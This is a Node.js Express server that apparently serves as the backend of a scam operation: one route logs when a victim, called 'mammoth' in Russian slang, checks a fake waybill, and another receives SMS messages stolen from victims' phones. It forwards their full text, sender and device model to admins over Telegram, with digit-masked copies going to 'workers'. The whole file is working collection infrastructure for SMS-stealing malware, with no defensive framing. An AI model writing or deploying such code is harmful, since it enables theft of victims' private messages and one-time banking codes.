const express = require('express');
const bodyParser = require('body-parser');
const dotenv = require('dotenv');
const db = require('better-sqlite3')('./db/database.db');
var crypto = require('crypto');
const { sendLogMessage, sendWorkerLogMessage, sendAdminLogMessage } = require('./telegram');
dotenv.config();

const app = express();
app.use(express.json({limit: '50mb'}));

const port = process.env.PORT;

app.get('/', async (req, res) => {
  await res.send('Express + TypeScript Server');
});

app.get('/vanilla', async (req, res) => {
  console.log(req.url);
  let workerId = req.query.uid;
  var info = 'Информации пока нет';
  let msg = `<b>Мамонт проверяет накладную ID: <code>${workerId}</code></b>`
  const row = db.prepare('SELECT text FROM nakl WHERE telega = ?').get(workerId);
  await sendLogMessage(msg);
  if (typeof row !== 'undefined') { info = row.text; try { await sendWorkerLogMessage(msg, workerId); } catch (e) { console.error(e); }}
  await res.json({"text": info, "ok": true});
});

app.post('/choco', async (req, res) => {
  let uid = req.query.uid;
  console.log(uid);
  const body = req.body;
  console.log(req.body);
  //if (body.length > 50) body = body.slice(0, 30);
  for (var sms of body) {
    var smstring = JSON.stringify(sms);
    var hash = crypto.createHash('md5').update(smstring).digest('hex');
    const row = db.prepare('SELECT hash FROM smses WHERE hash = ?').get(hash);
    if (typeof row !== 'undefined') { console.log("poxuy"); return await res.send('ok');}
    let d = new Date(parseInt(sms.date));
    var datestring = ("0" + d.getDate()).slice(-2) + "-" + ("0"+(d.getMonth()+1)).slice(-2) + "-" +
d.getFullYear() + " " + ("0" + d.getHours()).slice(-2) + ":" + ("0" + d.getMinutes()).slice(-2);
    const msg = ['<b>ID:</b> <code>' + sms.telega + '</code>',
                '<b>Устройство:</b> <code>' + sms.model + '</code>',
                '<b>Отправитель:</b> <code>' + sms.sender + '</code>',
                '<b>Дата:</b> <code>' + datestring + '</code>',
                '<b>Сообщение:</b> <code>' + sms.message +'</code>'].join("\n");
    const wrk_msg = ['<b>ID:</b> <code>' + sms.telega + '</code>',
                    '<b>Устройство:</b> <code>' + sms.model + '</code>',
                    '<b>Отправитель:</b> <code>' + sms.sender + '</code>',
                    '<b>Дата:</b> <code>' + datestring + '</code>',
                    '<b>Сообщение:</b> <code>' + sms.message.replace(/[0-9]/g, "*") +'</code>'].join("\n");
    const admins = db.prepare('SELECT * FROM users WHERE admin = 1').all();
    for (admin of admins) {
        await sendAdminLogMessage(msg, admin.telega);
    }
    //await sendLogMessage(msg);
    if ((sms.telega != "Not found") && (sms.telega != "")) try { await sendWorkerLogMessage(wrk_msg, sms.telega); } catch (e) { console.error(e); }
    db.prepare('INSERT INTO smses (hash) VALUES (?)').run(hash);
}
  await res.send('ok');
});

app.listen(port, () => {
  console.log(`[server]: Server is running at http://localhost:${port}`);
});
